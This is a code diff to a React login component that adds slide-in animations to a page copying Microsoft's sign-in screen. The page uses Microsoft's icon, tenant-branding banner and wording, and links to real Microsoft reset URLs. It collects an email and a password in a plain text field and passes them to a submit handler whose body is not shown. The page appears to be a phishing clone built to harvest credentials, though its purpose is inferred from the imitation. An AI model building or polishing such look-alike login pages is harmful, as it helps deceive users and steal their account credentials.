@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from "react";
 import iconSource from "../images/microsofticon.ico";
+import { motion } from "motion/react";
 import backArrow from "../images/logbackarrow.svg";
 
 const Login = (props: { next: string }) => {
@@ -7,8 +8,9 @@ const Login = (props: { next: string }) => {
   const icon = iconSource;
   const [useIsPassword, setIsPassword] = useState(false);
   const [usePass, setPass] = useState("");
+  const [isVisible, setIsVisible] = useState(true);
   const [useEmail, setEmail] = useState("");
-  const [useTest, setTest] = useState("opacity-[0%] l-[20px]");
+  const [useTest, setTest] = useState("opacity-[100%] l-[200px]");
   const test = `transition-all duration-800 ease-in-out relative ${useTest}`;
 
   const handleSubmit = () => {
@@ -17,9 +19,7 @@ const Login = (props: { next: string }) => {
   };
 
   useEffect(() => {
-    setEmail("");
-    setTest("opacity-[100%] l-[0px]");
-
+    setTest(test);
     document.title = title;
     const link: HTMLLinkElement | null =
       document.querySelector("link[rel*='icon']") ||
@@ -38,51 +38,63 @@ const Login = (props: { next: string }) => {
           {!useIsPassword && (
             <>
               <div className="w-full h-[80.75%] bg-white *:transition-all *:duration-800 *:ease-in-out overflow-hidden">
-                <div className={test}>
+                <div className="">
                   <div className="p-[44px] font-medium">
                     <img
                       src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
                       alt="TMP"
                       className="h-[36px]"
                     />
-                    <div>
-                      <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
-                        Sign in
-                      </h1>
-                      <input
-                        type="text"
-                        placeholder="Email, phone, or Skype"
-                        value={useEmail}
-                        onChange={(e) => {
-                          setEmail(e.target.value);
-                        }}
-                        className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
-                      />
-                      <div>
-                        <div className="flex text-[.8125rem]">
-                          <p className="text-black">
-                            {"No Account?"}{" "}
-                            <a
-                              className="text-[#0067b8]  inline-block pt-[16px] pl-[2px] block hover:text-stone-700 hover:underline"
-                              href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
-                            >
-                              Create one!
-                            </a>
-                          </p>
-                        </div>
-                        <div className="w-[108px] min-h-[32px] float-right">
-                          <button
-                            type="submit"
-                            onClick={() => {
-                              setIsPassword(true);
+                    {isVisible ? (
+                      <motion.div
+                        transition={{ type: "spring", ease: "easeOut" }}
+                        initial={{ x: "100%" }}
+                        animate={{ x: "0" }}
+                        exit={{ x: "100%" }}
+                      >
+                        <div>
+                          <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
+                            Sign in
+                          </h1>
+                          <input
+                            type="text"
+                            placeholder="Email, phone, or Skype"
+                            value={useEmail}
+                            onChange={(e) => {
+                              setEmail(e.target.value);
                             }}
-                            className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
-                          >
-                            Next
-                          </button>
+                            className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
+                          />
+                          <div>
+                            <div className="flex text-[.8125rem]">
+                              <p className="text-black">
+                                {"No Account?"}{" "}
+                                <a
+                                  className="text-[#0067b8]  inline-block pt-[16px] pl-[2px] block hover:text-stone-700 hover:underline"
+                                  href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
+                                >
+                                  Create one!
+                                </a>
+                              </p>
+                            </div>
+                            <div className="w-[108px] min-h-[32px] float-right">
+                              <button
+                                type="submit"
+                                onClick={() => {
+                                  setIsVisible(false);
+                                  setTimeout(() => {
+                                    setIsPassword(true);
+                                  }, 250);
+                                }}
+                                className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
+                              >
+                                Next
+                              </button>
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                    </div>
+                      </motion.div>
+                    ) : null}
                   </div>
                 </div>
               </div>
@@ -108,53 +120,65 @@ const Login = (props: { next: string }) => {
                       alt="TMP"
                       className="h-[36px]"
                     />
-                    <div>
-                      <div className="inline-flex mt-4">
-                        <img
-                          src={backArrow}
-                          alt="TMP"
-                          onClick={() => {
-                            setIsPassword(false);
-                            setPass("");
-                          }}
-                          className="mr-[2px] hover:cursor-pointer hover:bg-[rgba(0,0,0,0.1)] rounded-full active:bg-[rgba(0,0,0,0.4)]"
-                        />
-                        <p className="text-stone-700 leading-[24px]">
-                          {useEmail}
-                        </p>
-                      </div>
-                      <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
-                        Enter password
-                      </h1>
-                      <input
-                        type="text"
-                        placeholder="Password"
-                        value={usePass}
-                        onChange={(e) => {
-                          setPass(e.target.value);
-                        }}
-                        className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
-                      />
-                      <div>
-                        <a
-                          className="text-[#0067b8] pt-[16px] pl-[2px] text-[.8125rem] block hover:text-stone-700 hover:underline"
-                          href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
-                        >
-                          Forgot my password
-                        </a>
-                        <div className="w-[108px] min-h-[32px] float-right">
-                          <button
-                            type="submit"
-                            onClick={() => {
-                              handleSubmit();
+                    {!isVisible ? (
+                      <motion.div
+                        transition={{ type: "spring", ease: "easeOut" }}
+                        initial={{ x: "100%" }}
+                        animate={{ x: "0" }}
+                        exit={{ x: "100%" }}
+                      >
+                        <div>
+                          <div className="inline-flex mt-4">
+                            <img
+                              src={backArrow}
+                              alt="TMP"
+                              onClick={() => {
+                                setTimeout(() => {
+                                  setIsVisible(true);
+                                  setIsPassword(false);
+                                  setPass("");
+                                }, 250);
+                              }}
+                              className="mr-[2px] hover:cursor-pointer hover:bg-[rgba(0,0,0,0.1)] rounded-full active:bg-[rgba(0,0,0,0.4)]"
+                            />
+                            <p className="text-stone-700 leading-[24px]">
+                              {useEmail}
+                            </p>
+                          </div>
+                          <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
+                            Enter password
+                          </h1>
+                          <input
+                            type="text"
+                            placeholder="Password"
+                            value={usePass}
+                            onChange={(e) => {
+                              setPass(e.target.value);
                             }}
-                            className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
-                          >
-                            Sign in
-                          </button>
+                            className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
+                          />
+                          <div>
+                            <a
+                              className="text-[#0067b8] pt-[16px] pl-[2px] text-[.8125rem] block hover:text-stone-700 hover:underline"
+                              href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
+                            >
+                              Forgot my password
+                            </a>
+                            <div className="w-[108px] min-h-[32px] float-right">
+                              <button
+                                type="submit"
+                                onClick={() => {
+                                  handleSubmit();
+                                }}
+                                className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
+                              >
+                                Sign in
+                              </button>
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                    </div>
+                      </motion.div>
+                    ) : null}
                   </div>
                 </div>
               </div>
